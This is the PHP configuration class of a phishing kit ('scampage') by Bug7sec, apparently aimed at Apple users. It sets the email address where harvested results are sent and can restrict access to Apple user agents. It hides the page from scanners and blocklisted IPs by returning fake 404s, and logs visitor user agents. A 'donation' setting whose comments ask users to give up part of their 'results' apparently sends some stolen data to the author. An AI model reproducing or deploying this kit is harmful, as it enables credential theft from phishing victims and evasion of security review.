<?php
/**
 * @Author: Bug7sec
 * @Date:   2017-06-06 02:23:59
 * @Last Modified by:   Bug7sec.org
 * @Last Modified time: 2017-06-08 00:54:49
 */
class Config
{
	public function scampage(){
	    return array(
	      	'email' 		=> 'youremail@gmail.com',
	      	'truelogin' 	=> false,
	      	'user_allow' 	=> false, 	// true for apple user only and false for all user agent 
	      	'protocol'		=> 'http', 	// http or https
	      	/** Donasi kan sedikit dari hasil kamu | Donate a little of your results **/
	      	/** Bila saya tidak mendapatkan sebuah donasi maka saya dengan berat hati tidak ada versi scampage berikutnya :)  **/
	      	/** If I do not get a donation then I am reluctantly no scampage version next :) **/
	      	'donation' 		=> array(
	      		'status' 	=> true,    // TRUE for enable , and FALSE for disable 
	      		'country' 	=> strtoupper("US"), 
	      	),
	    );
	}
	public function BlockedByIp(){
		$file = file_get_contents("logs/ip-blocked.txt");
		$file = explode(",", $file);
		if(in_array($_SERVER['REMOTE_ADDR'],$file)) {
     		header('HTTP/1.0 404 Not Found');
     		exit();
		}
	}
	public function BlockedByAgent(){
		$izinkan    = $this->scampage();
		$detect_ua 	= strtolower( $_SERVER['HTTP_USER_AGENT'] );
		if($izinkan['user_allow']){
			if(!preg_match("/mac|ipod|ipad|iphone/", $detect_ua)){
				$f = fopen("logs/list-BlockedAgent-.txt", "a+");
				fwrite($f, $detect_ua."\r\n");
				fclose($f);
				header('HTTP/1.0 404 Not Found');
				exit();
			}else{
				$f = fopen("logs/list-AllowAgent-.txt", "a+");
				fwrite($f, $detect_ua."\r\n");
				fclose($f);
			}
		}
	}
}